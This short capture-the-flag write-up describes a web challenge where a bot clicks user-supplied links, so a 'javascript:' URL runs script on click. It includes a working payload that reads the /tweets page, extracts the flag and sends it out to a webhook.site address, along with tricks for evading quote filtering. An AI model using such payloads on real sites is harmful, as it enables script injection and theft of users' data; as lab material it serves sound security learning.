The issue in this web application is that the URL is fully user controlled, and no protocol sanitization happens.
There is a separate process running that opens every new post and clicks on the provided link.
Passing a link that starts with `javascript:` allows javascript execution on click.

An example link would be 
`console.log(jQuery.get(\`/tweets\`,function(response){window.location=\`https://webhook.site/0da86b21-132d-474f-a9e7-fed4c28cbb06?\`+response.match(/CSCBE{.*}/)[0]}))`

Backticks are used because both single and double quotes are filtered. The entire thing is wrapped in a console.log, because if the function returns something it doesn't actually redirect in Chrome. (appending `;return;` would also work). 
